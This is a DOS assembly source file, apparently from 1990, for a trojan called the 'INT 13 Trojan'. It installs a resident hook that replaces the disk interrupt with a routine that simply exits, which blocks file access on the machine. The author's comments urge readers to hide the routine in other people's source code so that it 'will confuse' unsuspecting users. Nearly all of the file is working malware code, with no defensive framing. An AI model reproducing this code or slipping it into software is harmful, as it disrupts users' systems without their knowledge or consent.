;*****************************************************************************
;                      The High Evolutionary's INT 13 Trojan
;*****************************************************************************
;
; Development Notes:
; (Dec.1O.9O)
;
; Well, I was screwing around with TSR's the other day and I got the idea,
; "Hmm. I wonder what would happen if you negated INT 13..." This trojan/TSR
; program answers my query.
;
; It's really a big mess. You can't access any file on the directory, you can't
; DIR anything, can't TYPE anything, I think the only thing you can do is
; DEL which is handled by INT 21.
;
; Well, in any event, put this routine in any nifty source code you see and
; then compile it... It will confuse the fuck out of any 100% "Lame" user.
;
; Have fun...
;
;   -= The High Evolutionary =-
;
;*****************************************************************************
;              Copyright (C) 199O by The RABID Nat'nl Development Corp.
;*****************************************************************************

        code segment
        assume cs:code,ds:code
        org 100h

start:  jmp     init_vectors

        mesg    db      'INT 13 Trojan by The High Evolutionary'
        crud    db      '(C) 199O by RABID Nat''nl Development Corp.'
        crap    dd      ?

program proc    far

        assume cs:code,ds:nothing

        mov     ax,4c00h                ; Terminate Program with exit code 00
        int     21h                     ; Call DOS

program endp

;
; The TSR initialization shit happens here...
;

init_vectors proc near

        assume cs:code,ds:code

        mov     ah,35h                  ; ask for int vector
        mov     al,13h                  ; intercept INT 13
        int     21h                     ; Call DOS
        mov     word ptr crap,bx
        mov     word ptr crap[2],es
        mov     ah,25h                  ; set int value
        mov     al,13h                  ; set for INT 13
        mov     dx,offset program       ; Tell the TSR what to do when accessed
        int     21h                     ; Call DOS
        mov     dx,offset init_vectors  ; Load in this segment into DX
        int     27h                     ; Make the sucker in DX TSR...

init_vectors endp

        code ends
end start
